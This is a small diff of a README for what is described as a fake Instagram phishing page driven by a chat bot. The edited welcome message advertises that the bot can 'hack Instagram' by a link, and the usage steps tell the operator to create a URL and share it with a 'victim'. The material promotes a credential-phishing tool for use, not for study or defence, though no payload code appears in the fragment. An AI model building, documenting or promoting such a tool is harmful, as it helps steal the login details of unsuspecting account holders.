@@ -15,7 +15,7 @@ In this repository I will teach how to make a fake phising page of instagram and
 Displays the welcome message and basic usage instructions for the bot.
 
 ```javascript
-Bot.sendMessage("WELCOME  ACCORDING BY JUST A LINK 🔗 \n\n𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄 \n 1.Send  /create command\n2.Now just share you generated url to victim.");
+Bot.sendMessage("WELCOME YOU CAN USE THIS BOT FOR HACK INSTAGRAM ACCORDING BY JUST A LINK 🔗 \n\n𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄 \n 1.Send  /create command\n2.Now just share you generated url to victim.");
 ```
 
 ### `/create`
